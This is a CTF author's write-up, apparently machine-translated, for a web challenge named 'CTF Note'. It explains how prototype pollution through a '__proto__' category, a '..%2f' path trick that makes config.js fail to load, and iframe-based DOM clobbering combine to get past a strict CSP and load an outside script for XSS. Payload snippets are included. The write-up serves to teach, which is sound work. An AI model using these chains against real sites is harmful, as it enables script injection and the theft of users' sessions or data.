## Solution

### TL;DR
1. Use `category` to prototype pollution that markdown.js library: write arbitrary HTML
2. Use `/whatever/..%2f` to make `config.js` 404
3. DOM Clobbering: create a nyanCat plugin yourself, load arbitrary js
4. XSS!

### Detailed Solution

In short, this is a website that can send writeup, in which we can set for each topic: category, name, writeup content, and the writeup part uses [markdown.js](https://github.com/evilstreak/markdown- js) of this library render.

The first problem you will find is that although the front end limits the value of the `category` part, the back end does not verify it and can write any value. What's wrong with that? `app.js:65` has this one-liner:
````javascript
WriteUps[writeup.category][writeup.challenge] = writeup.content;
````
Then if we set the `category` of a question to `__proto__`, then prototype pollution can be carried out smoothly.

After knowing this, you should be able to find out very quickly: once the prototype of `Object` is successfully polluted, each element generated by markdown render will be added with the attribute of `[challenge]=[content]`, and `challenge` (that is, the attribute name) part is not escaped by HTML, and can be written in any HTML.

However, due to strict CSP restrictions, we cannot currently do XSS
````
Content-Security-Policy:
default-src 'none'; base-uri 'none'; img-src 'self'; style-src 'self'; connect-src 'self'; script-src 'strict-dynamic' 'nonce-[hex]'
````

What is worth mentioning here is the meaning of `script-src 'strict-dynamic' 'nonce-{hex}'`:
- nonce-{hex} restricts the loading of only JavaScript with script elements with a specific nonce.
- 'strict-dynamic' can refer to [CSP Reference](https://content-security-policy.com/strict-dynamic/); in this scenario, it will allow script elements with nonce to be inserted into any script element and execute its js.

And the `loadPlugin` function in `app.js` in this question just meets this condition and can load script
````javascript
function loadPlugin(pluginName) {
    if (!(pluginName in CONFIG.plugins)) return;
    let script = document.createElement('script');
    script.src = CONFIG.plugins[pluginName];
    document.body.appendChild(script);
}
````
But as we can see, it passes in `pluginName` and reads the js path from `CONFIG.plugins[pluginName]`. Therefore, if you want to load your own js arbitrarily, you must first control `CONFIG`; and `CONFIG` is loaded from `config.js`:

````javascript
const CONFIG = {
    productName: "CTF Note",
    version: "v0.0.87",
    plugins: {
        nyanCat: '/plugins/nyan.js',
        xssSimulator: '/plugins/xss.js'
    }
};
````

At this point we can go back and see what writing arbitrary HTML can help us do!

There is a technique called DOM clobbering (for various techniques, please refer to [PortSwigger's article](https://portswigger.net/research/dom-clobbering-strikes-back)), which is a way to hijack the values ??????in js by manipulating the DOM ( Basically a global variable).

Obviously, what we want to control is `CONFIG`, but the problem is that direct DOM clobbering can't cover the existing variables, what should I do? Simple, just get it out of the way!

In fact, it should be found that the writing method of `config.js` in HTML is a bit different from other js and css. Everyone else is an absolute path under `/static`, but `config.js` is a relative path. .
```html
<script nonce="nonce" src="config.js"></script>
````

We can use this to make config.js 404, how to do it? Since nginx and browsers have different ways of parsing paths, a path that can be read by nginx but not by browsers can be constructed:
````
http://ctf-note.splitline.tw:9527/meow/..%2f
````
- For nginx, it will return to the previous directory because of `..%2f`, and successfully display the content of /.
- For browsers, `..%2f` is just a file name in the `meow` directory, so it will read `/meow/config.js` as a relative path.

As a result, config.js is 404 not found, and `CONFIG` disappears smoothly.

Next, back to DOM clobbering, we can use the iframe + srcdoc method to construct `CONFIG.plugins.nyanCat`:

```html
<iframe name=CONFIG srcdoc="
    <iframe id=CONFIG name=plugins
        srcdoc='<a id=nyanCat href=http://url/to/your.js>test</a>'>
"></iframe>
````

So far, we have been able to successfully insert our own js and achieve full XSS! The actual attack script can refer to `solution.py`.


## Postscript

Personally, I think this question is my favorite among the questions I asked in this CTF. When I first thought of combining prototype pollution and DOM clobbering, I came up with this question. In fact, it took a lot of time to design the question scene. . Having said that, this is also my first official XSS question. It's really tiring. The front-end, back-end and xss bot all have to be carefully designed. If it is a pure back-end question, the front-end can be written casually. XD

I feel that many people are missing the last step. They are stuck and don???t know how to cover config.js. In the end, no one has solved it. It???s still a pity. I originally hoped that one or two teams could solve it. XD
